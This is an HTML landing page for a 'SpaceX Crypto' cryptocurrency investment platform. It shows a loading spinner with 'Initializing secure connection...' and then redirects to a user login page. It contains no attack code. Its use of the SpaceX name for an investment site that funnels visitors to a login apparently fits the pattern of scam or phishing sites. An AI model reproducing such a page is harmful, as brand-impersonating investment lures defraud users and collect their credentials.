<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SpaceX Crypto - Secure Cryptocurrency Investment Platform</title>
    <link rel="stylesheet" href="css/main.css" />
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: "Arial", sans-serif;
        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        color: white;
      }

      .loading-container {
        text-align: center;
        padding: 2rem;
      }

      .logo {
        font-size: 3rem;
        font-weight: bold;
        margin-bottom: 1rem;
        background: linear-gradient(45deg, #ffd700, #ffed4e);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
      }

      .tagline {
        font-size: 1.2rem;
        margin-bottom: 2rem;
        opacity: 0.9;
      }

      .loading-spinner {
        width: 50px;
        height: 50px;
        border: 4px solid rgba(255, 255, 255, 0.3);
        border-top: 4px solid #ffd700;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 1rem;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .loading-text {
        font-size: 1rem;
        opacity: 0.8;
      }
    </style>

    <script
      type="module"
      src="https://static.rocket.new/rocket-web.js?_cfg=https%3A%2F%2Fcryptovaul9343back.builtwithrocket.new&_be=https%3A%2F%2Fapplication.rocket.new&_v=0.1.9"
    ></script>
    <script
      type="module"
      src="https://static.rocket.new/rocket-shot.js?v=0.0.1"
    ></script>
  </head>
  <body>
    <div class="loading-container">
      <div class="logo">SpaceX Crypto</div>
      <div class="tagline">Secure Cryptocurrency Investment Platform</div>
      <div class="loading-spinner"></div>
      <div class="loading-text">Initializing secure connection...</div>
    </div>

    <script>
      // Redirect to user login page after a brief loading animation
      setTimeout(function () {
        window.location.href = "pages/user_login.html";
      }, 2000);
    </script>
    <script id="dhws-dataInjector" src="/public/dhws-data-injector.js"></script>
  </body>
</html>
